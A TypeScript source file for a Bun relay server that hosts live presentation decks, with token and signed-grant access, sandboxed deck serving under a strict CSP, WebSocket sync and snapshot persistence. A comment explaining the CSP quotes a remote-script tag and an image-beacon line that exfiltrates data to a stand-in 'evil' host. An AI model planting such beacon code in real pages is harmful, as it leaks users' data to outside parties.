import {
  Hub,
  createSession,
  roleForToken,
  injectBootstrap,
  injectWatermark,
  audienceScopeFromHtml,
  type Peer,
  type PeerRole,
  type Role,
  type Session,
} from "@liebstoeckel/live-server";
import { bearer, matchAccount, safeEqual } from "./auth";
import { mintGrant, verifyGrant } from "./grant";
import { closeReason, createRelayMetrics } from "./metrics";
import { withSpan, SpanKind, ctxFromHeaders } from "./tracing";
import { CLOSE, LIVE_PROTOCOL, TOO_OLD_REASON, negotiateVersion } from "@liebstoeckel/live-server/placement/protocol";
import type { ServerWebSocket } from "bun";
import { SessionState, type StateStorage } from "./state";

/** Templated path for relay span names, collapse session ids so the span name stays bounded
 *  (`/sync/<id>` → `/sync/:id`), the trace-name equivalent of the metric cardinality rule. */
function tracePath(pathname: string): string {
  return pathname
    .replace(/^\/api\/sessions\/[^/]+/, "/api/sessions/:id")
    .replace(/^\/(s|sync)\/[^/]+/, "/$1/:id");
}

/** Pluggable object storage for session state. The hosted deploy wires a Bun S3
 *  client; the core stays storage-agnostic and testable. `list` and `delete` enable
 *  epoch-fenced state (sessions created with `x-session-epoch`); without them only
 *  the single-key snapshot (`x-snapshot-key`) is available. */
export interface RelayStorage {
  get(key: string): Promise<Uint8Array | null>;
  put(key: string, bytes: Uint8Array): Promise<void>;
  list?(prefix: string): Promise<string[]>;
  delete?(key: string): Promise<void>;
}

export interface RelayOptions {
  /** pre-shared account API tokens; a POST must present one as `Bearer` */
  accountTokens: readonly string[];
  port?: number;
  hostname?: string;
  /** public base URL for the links we hand back (e.g. https://relay.example).
   *  Omitted → derived from the request (honors x-forwarded-proto/host). */
  publicBaseUrl?: string;
  /** max uploaded deck size (bytes) */
  maxDeckBytes?: number;
  /** max concurrent sessions per account */
  maxSessionsPerAccount?: number;
  /** session lifetime; the doc + tokens are dropped after this */
  sessionTtlMs?: number;
  /** inbound WS frame cap */
  maxFrameBytes?: number;
  /** keepalive period for each session Hub */
  keepaliveMs?: number;
  /** object storage for session snapshots ((internal ADR)). Sessions created with an
   *  `x-snapshot-key` header are seeded from it on create and snapshotted to it on a
   *  timer + on end; absent → no persistence (the trusted/transient relay). */
  storage?: RelayStorage;
  /** snapshot debounce period (ms) for persisted sessions. */
  snapshotMs?: number;
  /** update-log flush period (ms) for epoch-fenced sessions. */
  logFlushMs?: number;
  /** how often (ms) an epoch-fenced session checks whether it was replaced or ended. */
  fenceMs?: number;
  /** per-audience-peer write rate (enforced sessions). */
  audienceRate?: { capacity: number; refillPerSec: number };
  /** image tag for the `liebstoeckel_relay_build_info` metric ((internal ADR)). */
  version?: string;
  /** The holder identity of this process's liveness lease (hosted). Reported with
   *  every created session and in /stats, so the control plane can tell a restarted
   *  pod (a new holder, empty memory) from the one it placed the session on. */
  holder?: string;
}

interface RelaySession {
  id: string;
  account: string;
  hub: Hub;
  /** the built deck HTML (no bootstrap yet, injected per request) */
  html: string;
  session: Session;
  /** privileged peer token: the local deck-runner that applies server-plugin effects */
  runnerToken: string;
  createdAt: number;
  /** effective lifetime (ms), the plan duration for hosted sessions ((internal ADR)),
   *  else the relay default. */
  ttlMs: number;
  /** hosted live ((internal ADR)): write-scope enforce audience peers. */
  enforce: boolean;
  /** max concurrent audience peers (plan's liveAudienceCap); undefined = uncapped. */
  audienceCap?: number;
  /** current connected audience peers (for the cap). */
  audienceCount: number;
  /** show the "Published with liebstoeckel" provenance badge (free tier; (internal ADR)). */
  watermark: boolean;
  /** object-storage key for this session's Yjs snapshot, if persisted. */
  snapshotKey?: string;
  /** epoch-fenced state (hosted, placed by the control plane); replaces snapshotKey. */
  state?: SessionState;
  ttl?: ReturnType<typeof setTimeout>;
  snap?: ReturnType<typeof setInterval>;
  log?: ReturnType<typeof setInterval>;
  fence?: ReturnType<typeof setInterval>;
  /** open sockets, closed with a reason when the session goes away */
  sockets: Set<ServerWebSocket<WSData>>;
}

export interface RelayServer {
  port: number;
  baseUrl: string;
  sessions: Map<string, RelaySession>;
  /** operational counters ((internal ADR) / (internal ticket)), snapshot write failures so a
   *  silently-lost result surfaces in logs/metrics instead of vanishing. */
  stats(): { snapshotFailures: number };
  /** Flush every active session's final snapshot, then tear down. Awaitable so a
   *  SIGTERM handler can guarantee the writes land before the process exits
   *  ((internal ADR) §5 / (internal ticket), the racy fire-and-forget path lost results). */
  stop(): Promise<void>;
}

type WSData = { sessionId: string; peer: Peer | null; role: PeerRole; tooOld?: boolean };

const hex = (bytes = 16): string => {
  const a = new Uint8Array(bytes);
  crypto.getRandomValues(a);
  return Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
};

const DEFAULTS = {
  maxDeckBytes: 8 * 1024 * 1024,
  // Per-pod safety valve, NOT the platform ceiling ((internal ADR) §2 / (internal ticket)): real
  // concurrency is gated by per-org entitlements + per-pod capacity in the control
  // plane's choosePod, and sessions spread across the StatefulSet's pods. This just
  // backstops a single pod's RAM.
  maxSessionsPerAccount: 200,
  sessionTtlMs: 6 * 60 * 60 * 1000,
  maxFrameBytes: 4 * 1024 * 1024,
  // Well inside the live client's watchdog, so a hung relay is left within about 35 s.
  keepaliveMs: 10_000,
  snapshotMs: 20_000,
  logFlushMs: 1_500,
  fenceMs: 10_000,
  audienceRate: { capacity: 20, refillPerSec: 5 },
};

/** Resolve the public http/ws origins for the links we return. */
function originOf(req: Request, opts: RelayOptions): { http: string; ws: string } {
  if (opts.publicBaseUrl) {
    const b = opts.publicBaseUrl.replace(/\/$/, "");
    return { http: b, ws: b.replace(/^http/i, "ws") };
  }
  const url = new URL(req.url);
  const proto = req.headers.get("x-forwarded-proto") ?? (url.protocol === "https:" ? "https" : "http");
  const host = req.headers.get("x-forwarded-host") ?? url.host;
  return { http: `${proto}://${host}`, ws: `${proto === "https" ? "wss" : "ws"}://${host}` };
}

const json = (body: unknown, status = 200): Response =>
  new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

/** Resolve a session's role for a token: presenter/viewer (public) or runner
 *  (the privileged deck-runner peer). null = deny. */
function relayRole(s: RelaySession, token: string | null): Role | "runner" | null {
  if (!token) return null;
  if (safeEqual(s.runnerToken, token)) return "runner";
  return roleForToken(s.session, token);
}

/** Resolve a connection's role from `?t=…`, preferring a **signed grant** ((internal ADR)):
 *  the control plane mints presenter/viewer grants the relay verifies statelessly with
 *  the session's account token, no per-session token lookup. Falls back to the raw
 *  session tokens (CLI presenter/viewer) and the runner token. null = deny. */
function resolveRole(s: RelaySession, token: string | null, now: number): Role | "runner" | null {
  if (!token) return null;
  const g = verifyGrant(token, s.account, now);
  if (g && g.session === s.id && (g.role === "presenter" || g.role === "viewer")) return g.role;
  return relayRole(s, token);
}

/** A public relay: account-token-gated deck upload, opaque-origin deck serving,
 *  and a token-gated Yjs WebSocket per session. Decks run their code locally (the
 *  runner connects as a privileged peer); the relay only relays + serves bytes. */
export function createRelay(opts: RelayOptions): RelayServer {
  const cfg = { ...DEFAULTS, ...opts };
  if (!opts.accountTokens.length) throw new Error("createRelay: at least one account token is required");
  const sessions = new Map<string, RelaySession>();
  let snapshotFailures = 0;
  // Process start time, reported in /stats so the reconciler can tell when a pod has
  // RESTARTED (same name, fresh memory) and re-provision sessions it lost, not just when
  // a pod is gone ((internal ADR) §5 / (internal ticket)+0019).
  const startedAt = Date.now();
  // Drain flag ((internal ADR) §4 / (internal ticket)): the reconciler cordons a pod (POST /cordon)
  // to stop NEW placement while existing sessions finish. Reported in /stats so the
  // control plane's choosePod skips it; in-memory, so a recreated pod starts uncordoned.
  let cordoned = false;

  // Metrics ((internal ADR) / (internal ticket)). Per-instance registry; scrape-time gauges are read
  // from the live `sessions` map. Served bearer-gated at GET /metrics below.
  const metrics = createRelayMetrics(opts.version ?? process.env.PRESENT_RELAY_VERSION ?? "unknown");
  metrics.registry.onCollect(() => {
    let audience = 0;
    let deckBytes = 0;
    for (const s of sessions.values()) {
      audience += s.audienceCount;
      deckBytes += Buffer.byteLength(s.html, "utf8");
    }
    metrics.sessions.set(sessions.size);
    metrics.audiencePeers.set(audience);
    metrics.deckBytes.set(deckBytes);
    metrics.cordoned.set(cordoned ? 1 : 0);
    metrics.startedAt.set(Math.floor(startedAt / 1000));
  });

  const persist = async (s: RelaySession) => {
    if (!cfg.storage || (!s.snapshotKey && !s.state)) return;
    metrics.snapshotWrites.inc();
    try {
      if (s.state) await s.state.snapshot(s.hub.snapshot());
      else await cfg.storage.put(s.snapshotKey!, s.hub.snapshot());
    } catch (e) {
      // Best-effort: a failed write must never crash the relay, but it must NOT be
      // silent (results would vanish). Structured log + a counter ((internal ADR)).
      snapshotFailures++;
      metrics.snapshotFailures.inc();
      console.error(
        JSON.stringify({ level: "error", msg: "relay snapshot persist failed", key: s.snapshotKey, err: String(e) }),
      );
    }
  };

  /** Tear a session down. `ended` and `restarting` store the final state first
   *  (results survive); `moved` stores nothing, another pod owns the session now.
   *  Every socket is closed with the matching code, so clients act at once instead
   *  of waiting for a watchdog, and the audience count follows. */
  const dropSession = async (s: RelaySession, reason: "ended" | "moved" | "restarting" = "ended"): Promise<void> => {
    if (s.ttl) clearTimeout(s.ttl);
    if (s.snap) clearInterval(s.snap);
    if (s.log) clearInterval(s.log);
    if (s.fence) clearInterval(s.fence);
    if (sessions.get(s.id) === s) sessions.delete(s.id);
    if (reason === "moved") s.state?.stop();
    else await persist(s);
    s.state?.stop();
    const code = reason === "moved" ? CLOSE.MOVED : reason === "restarting" ? CLOSE.RESTARTING : CLOSE.ENDED;
    for (const socket of [...s.sockets]) socket.close(code, reason);
    s.hub.destroy();
  };

  // POST /api/sessions, create a live session from an uploaded deck ((internal ADR)). A closure over
  // cfg/sessions/metrics/persist/dropSession; returns the session-info JSON, or a reject response
  // (401/503/413/400/429) with the matching metric incremented.
  const handleCreateSession = async (req: Request): Promise<Response> => {
    const account = matchAccount(cfg.accountTokens, bearer(req));
    if (!account) {
      metrics.sessionRejects.inc({ reason: "unauthorized" });
      return json({ error: "unauthorized" }, 401);
    }
    // The control plane names the live protocol it expects (`x-live-protocol`; none
    // means version 1): one this relay no longer speaks is refused before any work.
    const version = negotiateVersion(req.headers.get("x-live-protocol"), LIVE_PROTOCOL);
    if (!version.ok) {
      metrics.sessionRejects.inc({ reason: "protocol" });
      return json({ error: version.message }, version.status);
    }
    // Cordoned pods take no new sessions, a backstop; placement already skips us.
    if (cordoned) {
      metrics.sessionRejects.inc({ reason: "cordoned" });
      return json({ error: "relay draining" }, 503);
    }

    const declared = Number(req.headers.get("content-length") ?? "0");
    if (declared > cfg.maxDeckBytes) {
      metrics.sessionRejects.inc({ reason: "too_large" });
      return json({ error: "deck too large" }, 413);
    }
    const html = await req.text();
    if (Buffer.byteLength(html, "utf8") > cfg.maxDeckBytes) {
      metrics.sessionRejects.inc({ reason: "too_large" });
      return json({ error: "deck too large" }, 413);
    }
    if (!html.trim()) {
      metrics.sessionRejects.inc({ reason: "empty" });
      return json({ error: "empty deck" }, 400);
    }

    const count = [...sessions.values()].filter((s) => s.account === account).length;
    if (count >= cfg.maxSessionsPerAccount) {
      metrics.sessionRejects.inc({ reason: "quota" });
      return json({ error: "session quota reached" }, 429);
    }

    // Hosted live ((internal ADR)): the control plane opts a session into audience
    // write-scope enforcement (scope read from the deck's own embedded manifest)
    // and names the object-storage key its Yjs snapshot persists to.
    const enforce = req.headers.get("x-live-enforce") === "1";
    const snapshotKey = req.headers.get("x-snapshot-key") || undefined;
    // Plan limits the control plane passes per session ((internal ADR)): the duration
    // (so a free session's link dies on time, not at the relay's 6h default) and
    // the audience cap. TTL is clamped to the relay max; absent → relay default.
    const reqTtl = Number(req.headers.get("x-session-ttl-ms") ?? "");
    const ttlMs = Number.isFinite(reqTtl) && reqTtl > 0 ? Math.min(reqTtl, cfg.sessionTtlMs) : cfg.sessionTtlMs;
    const capHdr = Number(req.headers.get("x-audience-cap") ?? "");
    const audienceCap = Number.isFinite(capHdr) && capHdr > 0 ? capHdr : undefined;
    const watermark = req.headers.get("x-watermark") === "1";
    // Stable session id across re-provision ((internal ADR)): the control plane re-creates
    // a recovered session under the SAME id on a new pod, so the audience URL
    // (`/s/<id>?t=<grant>`) and its stateless grant stay valid, only the pod the
    // multi-layer ForwardAuth route resolves to changes. Absent (CLI) → relay mints one.
    const providedId = (req.headers.get("x-session-id") || "").trim() || undefined;
    // Epoch-fenced state (hosted): the control plane bumps the epoch on every
    // (re)placement and names the org the state lives under. Needs a listable store.
    const epochHdr = Number(req.headers.get("x-session-epoch") ?? "");
    const stateOrg = (req.headers.get("x-state-org") || "").trim();
    const fenced =
      providedId !== undefined && Number.isSafeInteger(epochHdr) && epochHdr > 0 && stateOrg !== "" &&
      !!cfg.storage?.list && !!cfg.storage?.delete;

    const session = createSession();
    if (providedId) {
      // A stale entry under this id (re-provision raced its predecessor's teardown)
      // goes first so the fresh, re-seeded one wins. Under epochs the new one loads
      // what the old one stored, so the old one must store before it goes.
      const stale = sessions.get(providedId);
      if (stale) {
        if (stale.state && stale.state.epoch >= epochHdr) {
          metrics.sessionRejects.inc({ reason: "stale_epoch" });
          return json({ error: "a newer placement of this session is already here" }, 409);
        }
        await dropSession(stale, "moved");
      }
      session.id = providedId;
    }
    let state: SessionState | undefined;
    let seed: Uint8Array | null = null;
    if (fenced) {
      try {
        const opened = await SessionState.open({
          storage: cfg.storage as StateStorage,
          org: stateOrg,
          session: providedId!,
          epoch: epochHdr,
        });
        if (opened === "stale") {
          metrics.sessionRejects.inc({ reason: "stale_epoch" });
          return json({ error: "a newer placement of this session exists" }, 409);
        }
        state = opened.state;
        seed = opened.seed;
      } catch (e) {
        metrics.sessionRejects.inc({ reason: "storage" });
        console.error(JSON.stringify({ level: "error", msg: "relay state load failed", session: providedId, err: String(e) }));
        return json({ error: "session state unavailable" }, 503);
      }
    }
    const hub = new Hub({
      keepaliveMs: cfg.keepaliveMs,
      audience: enforce ? { scope: audienceScopeFromHtml(html), rate: cfg.audienceRate } : undefined,
    });
    // Re-seed from the stored state: the previous epoch's, or (a session placed
    // before epochs, or unfenced) the single snapshot key.
    if (seed) {
      hub.seed(seed);
      metrics.snapshotSeed.inc({ result: "hit" });
    } else if (cfg.storage && snapshotKey) {
      try {
        const prior = await cfg.storage.get(snapshotKey);
        if (prior) {
          hub.seed(prior);
          metrics.snapshotSeed.inc({ result: "hit" });
        } else {
          metrics.snapshotSeed.inc({ result: "miss" });
        }
      } catch {
        /* no prior snapshot / unreadable → start fresh */
        metrics.snapshotSeed.inc({ result: "error" });
      }
    }
    const rs: RelaySession = {
      id: session.id,
      account,
      hub,
      html,
      session,
      runnerToken: hex(),
      createdAt: Date.now(),
      ttlMs,
      enforce,
      audienceCap,
      audienceCount: 0,
      watermark,
      snapshotKey: state ? undefined : snapshotKey,
      state,
      sockets: new Set(),
    };
    const unref = (t: unknown) => (t as { unref?: () => void }).unref?.();
    rs.ttl = setTimeout(() => void dropSession(rs), ttlMs);
    unref(rs.ttl);
    if (state) {
      // Every change goes to the update log within ~1.5 s, so a crash loses at most
      // that much (the presenter's client resends its own state on reconnect).
      hub.doc.on("update", (update: Uint8Array) => state!.note(update));
      // The first snapshot makes this epoch visible at once: an older owner still
      // running learns at its next fence check that it was replaced.
      await persist(rs);
      rs.log = setInterval(() => {
        state!.flushLog().catch((e) => {
          snapshotFailures++;
          metrics.snapshotFailures.inc();
          console.error(JSON.stringify({ level: "error", msg: "relay log flush failed", session: rs.id, err: String(e) }));
        });
      }, cfg.logFlushMs);
      unref(rs.log);
      rs.fence = setInterval(() => {
        state!.fence().then(
          (result) => {
            if (result === "owner" || sessions.get(rs.id) !== rs) return;
            metrics.sessionFenced.inc({ result });
            void dropSession(rs, result === "ended" ? "ended" : "moved");
          },
          () => undefined, // storage unreachable: keep serving, check again later
        );
      }, cfg.fenceMs);
      unref(rs.fence);
    }
    if (cfg.storage && (snapshotKey || state)) {
      rs.snap = setInterval(() => void persist(rs), cfg.snapshotMs);
      unref(rs.snap);
    }
    sessions.set(rs.id, rs);
    metrics.sessionCreates.inc();

    // Mint signed, expiring presenter/viewer grants ((internal ADR)), the links carry
    // these, and the relay verifies them statelessly with the account token; no
    // per-session token is stored client-side. (Raw tokens are still returned for
    // CLI/runner back-compat.)
    const exp = rs.createdAt + ttlMs;
    const presenterGrant = mintGrant({ session: rs.id, role: "presenter", exp }, account);
    const viewerGrant = mintGrant({ session: rs.id, role: "viewer", exp }, account);

    const { http, ws } = originOf(req, opts);
    return json({
      id: rs.id,
      ...(opts.holder ? { holder: opts.holder } : {}),
      presenterToken: session.presenterToken,
      viewerToken: session.viewerToken,
      runnerToken: rs.runnerToken,
      presenterGrant,
      viewerGrant,
      expiresAt: exp,
      protocol: version.version,
      urls: {
        presenter: `${http}/s/${rs.id}?t=${presenterGrant}`,
        viewer: `${http}/s/${rs.id}?t=${viewerGrant}`,
        sync: `${ws}/sync/${rs.id}`,
      },
    });
  };

  // GET /s/:id, serve the deck to a grant-bearing presenter/viewer in an opaque sandbox
  // ((internal ADR)/0069). A closure over sessions; returns the sandboxed HTML, or a 403 on a
  // missing/invalid/expired grant (runner tokens are WS-only and may not load the page).
  const serveDeck = (req: Request, url: URL, id: string): Response => {
    const s = sessions.get(id);
    const token = url.searchParams.get("t");
    const role = s ? resolveRole(s, token, Date.now()) : null;
    if (!s || !role || role === "runner" || !token) {
      metrics.grantDenials.inc();
      return new Response("Invalid or expired link.", { status: 403 });
    }
    const { http, ws } = originOf(req, opts);
    const wsUrl = `${ws}/sync/${s.id}?t=${token}`;
    const viewer = `${http}/s/${s.id}?t=${s.session.viewerToken}`;
    // Free-tier provenance badge on the public audience view ((internal ADR)); paid
    // (white-label) sessions omit it. Presenter view is never watermarked.
    const html = s.watermark && role === "viewer" ? injectWatermark(s.html) : s.html;
    const body = injectBootstrap(html, { ws: wsUrl, session: s.id, role, token, participant: "", viewer });
    return new Response(body, {
      headers: {
        "content-type": "text/html; charset=utf-8",
        // Opaque-origin isolation: no allow-same-origin → the deck can't reach
        // the relay's cookies/API/DOM, and each load is a fresh opaque origin
        // (deck-to-deck isolation). connect-src pins the live socket to us.
        // `allow-popups` enables the presenter pop-out (P → window.open of
        // /s/:id?t=<presenterToken>#presenter), the popup is itself served
        // sandboxed by the relay and syncs through the Hub, so isolation holds
        // ((internal ADR)). Without it window.open throws in the sandbox.
        // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
        // iframe/Permissions-Policy feature), browsers reject it and log a
        // console error. Fullscreen for this top-level doc is governed by the
        // Fullscreen API / Permissions-Policy, not the sandbox directive.
        //
        // `default-src 'none'` + a single-file allowlist ((internal ADR)): a deck
        // inlines all assets ((internal ADR)), so it needs zero external origins, // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
        // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
        // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
        // to our sync socket and `allow-popups` for the presenter pop-out.
        "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
        "x-content-type-options": "nosniff",
        "referrer-policy": "no-referrer",
      },
    });
  };

  // HTTP dispatcher, a closure (keeps access to sessions/cfg/cordoned), wrapped in a SERVER span
  // by the Bun.serve `fetch` below. Returns a Response, or undefined for a successful WebSocket
  // upgrade (Bun's hold-the-socket signal). The two fat routes live in their own closures above;
  // the small infra/control + connect routes stay inline.
  const handleFetch = async (req: Request, srv: Bun.Server<WSData>): Promise<Response | undefined> => {
    const url = new URL(req.url);
    const { pathname } = url;

    if (pathname === "/healthz") return new Response("ok");

    // --- fleet stats: this pod's live load, for control-plane placement ((internal ADR) §2). ---
    // Account-gated, the per-pod Ingress makes it publicly reachable.
    if (pathname === "/stats") {
      if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
      return json({ ok: true, sessions: sessions.size, cordoned, startedAt, ...(opts.holder ? { holder: opts.holder } : {}) });
    }

    // --- Prometheus metrics: this pod's logical state ((internal ADR)). Account-gated like /stats, so
    // the bearer keeps it off the public surface; Alloy scrapes it on the pod network. ---
    if (pathname === "/metrics") {
      if (!matchAccount(cfg.accountTokens, bearer(req))) return new Response("unauthorized", { status: 401 });
      return new Response(metrics.registry.render(), {
        headers: { "content-type": "text/plain; version=0.0.4; charset=utf-8" },
      });
    }

    // --- drain control: cordon/uncordon this pod (reconciler only, (internal ADR) §4). Cordoned →
    // refuse NEW sessions; existing run to completion. `{ "cordoned": false }` lifts it. ---
    if (pathname === "/cordon" && req.method === "POST") {
      if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
      const body = (await req.json().catch(() => ({}))) as { cordoned?: boolean };
      cordoned = body.cordoned !== false;
      return json({ ok: true, cordoned });
    }

    // --- control API: create / end a session ((internal ADR)). ---
    if (pathname === "/api/sessions" && req.method === "POST") return handleCreateSession(req);
    // `x-session-epoch` (hosted) names the placement that supersedes this one: a
    // request for an epoch not above ours is late and must not drop the current
    // placement. `?reason=moved` (another pod took over) stores nothing and closes
    // sockets with `moved`; otherwise the session ended: final state, then `ended`.
    const del = pathname.match(/^\/api\/sessions\/([^/]+)$/);
    if (del && req.method === "DELETE") {
      const account = matchAccount(cfg.accountTokens, bearer(req));
      if (!account) return json({ error: "unauthorized" }, 401);
      const s = sessions.get(del[1]!);
      if (!s || s.account !== account) return json({ error: "not found" }, 404);
      const by = Number(req.headers.get("x-session-epoch") ?? "");
      if (s.state && Number.isSafeInteger(by) && by <= s.state.epoch) return json({ error: "stale request" }, 409);
      await dropSession(s, url.searchParams.get("reason") === "moved" ? "moved" : "ended");
      return new Response(null, { status: 204 });
    }

    // --- WebSocket sync: audience/presenter connect ((internal ADR)). ---
    const sync = pathname.match(/^\/sync\/([^/]+)$/);
    if (sync) {
      const s = sessions.get(sync[1]!);
      const relRole = s ? resolveRole(s, url.searchParams.get("t"), Date.now()) : null;
      if (!s || !relRole) {
        metrics.grantDenials.inc();
        return new Response("forbidden", { status: 403 });
      }
      // viewer → audience (write-scope enforced when the session opted in);
      // presenter + runner are trusted writers.
      const role: PeerRole = relRole === "viewer" ? "audience" : "presenter";
      // Enforce the plan's audience cap ((internal ADR)), presenter/runner never count.
      if (role === "audience" && s.audienceCap !== undefined && s.audienceCount >= s.audienceCap) {
        metrics.audienceCapRejects.inc();
        return new Response("audience full", { status: 503 });
      }
      // A browser cannot read the body of a refused upgrade, so an old client is let
      // in and then closed with a code that tells it why.
      const tooOld = !negotiateVersion(url.searchParams.get("v"), LIVE_PROTOCOL).ok;
      const data: WSData = { sessionId: s.id, peer: null, role, tooOld };
      return srv.upgrade(req, { data }) ? undefined : new Response("upgrade failed", { status: 400 });
    }

    // --- serve the deck in an opaque sandbox ((internal ADR)/0069). ---
    const serve = pathname.match(/^\/s\/([^/]+)$/);
    if (serve) return serveDeck(req, url, serve[1]!);

    return new Response("not found", { status: 404 });
  };

  const server = Bun.serve<WSData>({
    port: opts.port ?? 0,
    hostname: opts.hostname ?? "0.0.0.0",
    // OSS-safe ingress tracing: gated by OTEL_EXPORTER_OTLP_ENDPOINT (a no-op with NO egress when
    // unset, a standalone/offline relay emits nothing). A SERVER span continuing the inbound W3C
    // traceparent so the relay JOINS the trace: control → relay (session create) and the audience
    // traefik → relay path. Infra/control paths (probes, scrapes, cordon) are not traced.
    fetch(req, srv) {
      const { pathname } = new URL(req.url);
      if (pathname === "/healthz" || pathname === "/stats" || pathname === "/metrics" || pathname === "/cordon") {
        return handleFetch(req, srv);
      }
      return withSpan(
        `relay ${req.method} ${tracePath(pathname)}`,
        ctxFromHeaders(req.headers),
        { "http.request.method": req.method, "url.path": pathname },
        () => handleFetch(req, srv),
        SpanKind.SERVER,
      );
    },
    websocket: {
      idleTimeout: 120,
      maxPayloadLength: cfg.maxFrameBytes,
      open(socket) {
        if (socket.data.tooOld) {
          metrics.protocolRejects.inc();
          socket.close(CLOSE.PROTOCOL_TOO_OLD, TOO_OLD_REASON);
          return;
        }
        const s = sessions.get(socket.data.sessionId);
        if (!s) {
          socket.close();
          return;
        }
        s.sockets.add(socket);
        if (socket.data.role === "audience") s.audienceCount++;
        metrics.wsOpens.inc({ role: socket.data.role });
        metrics.wsConnections.inc({ role: socket.data.role });
        socket.data.peer = s.hub.join((d) => {
          metrics.wsFrames.inc({ dir: "out" });
          metrics.wsBytes.inc({ dir: "out" }, d.byteLength);
          socket.send(d);
        }, socket.data.role);
      },
      message(socket, msg) {
        if (typeof msg === "string") return;
        const bytes = new Uint8Array(msg as unknown as ArrayBufferLike);
        if (bytes.byteLength > cfg.maxFrameBytes) return;
        metrics.wsFrames.inc({ dir: "in" });
        metrics.wsBytes.inc({ dir: "in" }, bytes.byteLength);
        socket.data.peer?.recv(bytes);
      },
      close(socket, code) {
        socket.data.peer?.leave();
        metrics.wsCloses.inc({ role: socket.data.role, reason: closeReason(code) });
        metrics.wsConnections.dec({ role: socket.data.role });
        const s = sessions.get(socket.data.sessionId);
        if (s && s.sockets.delete(socket) && socket.data.role === "audience" && s.audienceCount > 0) s.audienceCount--;
      },
    },
  });

  const port = server.port ?? 0;
  return {
    port,
    baseUrl: opts.publicBaseUrl?.replace(/\/$/, "") ?? `http://${opts.hostname ?? "0.0.0.0"}:${port}`,
    sessions,
    stats: () => ({ snapshotFailures }),
    async stop() {
      // Store every session's final state and AWAIT the writes before tearing down,
      // so a SIGTERM followed by process.exit cannot race the S3 PUTs. Clients get
      // `restarting` and reconnect to wherever the session is placed next.
      await Promise.allSettled([...sessions.values()].map((s) => dropSession(s, "restarting")));
      server.stop(true);
    },
  };
}
